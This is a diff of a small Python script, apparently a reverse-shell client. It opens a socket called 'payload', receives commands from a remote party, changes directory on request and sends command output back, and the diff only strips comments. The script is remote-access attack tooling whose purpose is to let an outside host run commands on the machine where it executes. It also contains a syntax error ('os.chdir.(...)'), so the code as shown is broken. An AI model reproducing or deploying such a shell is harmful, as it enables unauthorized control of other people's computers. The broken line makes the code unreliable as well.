@@ -1,7 +1,6 @@
 import socket
 import subprocess
 
-# import a library for change directory
 import os
 
 payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -18,14 +17,13 @@ def send_data(ouput_data):
  
 while True:
 	cmd = payload.recv(2048)
-	cmd = cmd.decode("utf-8") # string
+	cmd = cmd.decode("utf-8")
 	
-	if cmd == "quit": # no longer need to decode with byte
+	if cmd == "quit":
 		payload.close()
 		break
 	
 	elif cmd[:2] == "cd":
-		# Handle Change Directory (cd) Exception
 		try:
 			os.chdir.(cmd[3:])
 		except FileNotFoundError:
@@ -41,4 +39,4 @@ while True:
 	else:
 		send_data(output)
 
-print("Disconnected") # display disconnection message
+print("Disconnected")
